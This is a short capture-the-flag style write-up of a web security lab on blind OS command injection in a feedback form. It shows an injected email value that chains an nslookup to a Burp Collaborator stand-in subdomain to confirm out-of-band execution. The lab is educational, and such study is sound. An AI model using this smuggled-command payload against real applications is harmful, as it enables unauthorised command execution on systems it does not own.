This lab contains a blind OS command injection vulnerability in the feedback function.

The application executes a shell command containing the user-supplied details. The command is executed asynchronously and has no effect on the application's response. It is not possible to redirect output into a location that you can access. However, you can trigger out-of-band interactions with an external domain.

To solve the lab, exploit the blind OS command injection vulnerability to issue a DNS lookup to Burp Collaborator.

> NOTE: To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.

> We use Burp Suite to intercept the request that submits feedback.

![image](https://github.com/udayk01/Web-Security/assets/52235763/7b6cd1af-c6e4-478f-861c-0801fe0c7aa2)

> Then we modify the email parameter changing it to `email=x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||`

![image](https://github.com/udayk01/Web-Security/assets/52235763/735695bf-4640-4d57-a7f6-bdaf79b6f6a4)

> We can see the DNS lookup triggered and shown in Collaborator

![image](https://github.com/udayk01/Web-Security/assets/52235763/6fae7131-9afc-4503-bbfb-dee11892afdc)

![image](https://github.com/udayk01/Web-Security/assets/52235763/485b0f10-efef-497f-aa42-c3f4892075ef)



